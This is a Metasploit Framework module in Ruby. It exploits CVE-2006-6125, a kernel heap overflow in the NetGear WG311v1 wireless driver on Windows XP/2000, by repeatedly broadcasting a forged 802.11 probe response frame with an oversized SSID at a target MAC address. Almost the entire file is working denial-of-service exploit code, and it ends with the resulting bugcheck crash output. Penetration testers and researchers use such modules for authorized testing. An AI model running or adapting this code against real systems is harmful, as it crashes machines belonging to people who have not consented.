##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetGear WG311v1 Wireless Driver Long SSID Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in the NetGear WG311v1 wireless device
        driver under Windows XP and 2000. A kernel-mode heap overflow occurs
        when malformed probe response frame is received that contains a long SSID field

        This DoS was tested with version 2.3.1.10 of the WG311ND5.SYS driver and a
        NetGear WG311v1 PCI card. A remote code execution module is also in development.

        This module depends on the Lorcon2 library and only works on the Linux platform
        with a supported wireless card. Please see the Ruby Lorcon2 documentation
        (external/ruby-lorcon/README) for more information.
      },
      'Author'         => [ 'Laurent Butti <0x9090 [at] gmail.com>' ], # initial discovery and metasploit module
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2006-6125'],
          ['OSVDB', '30511'],
          ['URL', 'http://projects.info-pull.com/mokb/MOKB-22-11-2006.html'],
          ['URL', 'ftp://downloads.netgear.com/files/wg311_1_3.zip'],
        ]
    ))
    register_options(
      [
        OptInt.new('RUNTIME', [ true, "The number of seconds to run the attack", 60]),
        OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
      ], self.class)
  end

  def run

    open_wifi

    stime = Time.now.to_i
    rtime = datastore['RUNTIME'].to_i
    count = 0

    print_status("Creating malicious probe response frame...")

    frame = create_probe_response()

    print_status("Sending malicious probe response frames for #{datastore['RUNTIME']} seconds...")

    while (stime + rtime > Time.now.to_i)
      wifi.write(frame)
      select(nil, nil, nil, 0.10) if (count % 100 == 0)
      count += 1
    end

    print_status("Completed sending #{count} probe responses.")
  end

  def create_probe_response
    bssid    = Rex::Text.rand_text(6)
    seq      = [rand(255)].pack('n')

    frame =
      "\x50" +                      # type/subtype
      "\x00" +                      # flags
      "\x00\x00" +                  # duration
      eton(datastore['ADDR_DST']) + # dst
      bssid +                       # src
      bssid +                       # bssid
      seq   +                       # seq
      Rex::Text.rand_text(8) +      # timestamp value
      "\x64\x00" + 	              # beacon interval
      "\x01\x00" +	              # capabilities

      # SSID IE overflow
      "\x00" + "\xff" + ("\x41" * 255) +

      # supported rates IE
      "\x01" + "\x08" + "\x02\x04\x0b\x16\x0c\x18\x30\x48" +

      # channel IE
      "\x03" + "\x01" + channel.chr

    return frame

  end
end

=begin
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_POOL_HEADER (19)
The pool is already corrupt at the time of the current request.
This may or may not be due to the caller.
The internal pool links must be walked to figure out a possible cause of
the problem, and then special pool applied to the suspect tags or the driver
verifier to a suspect driver.
Arguments:
Arg1: 00000020, a pool block header size is corrupt.
Arg2: 81cae7b0, The pool entry we were looking for within the page.
Arg3: 81cae8c8, The next pool entry.
Arg4: 0a23002b, (reserved)
=end
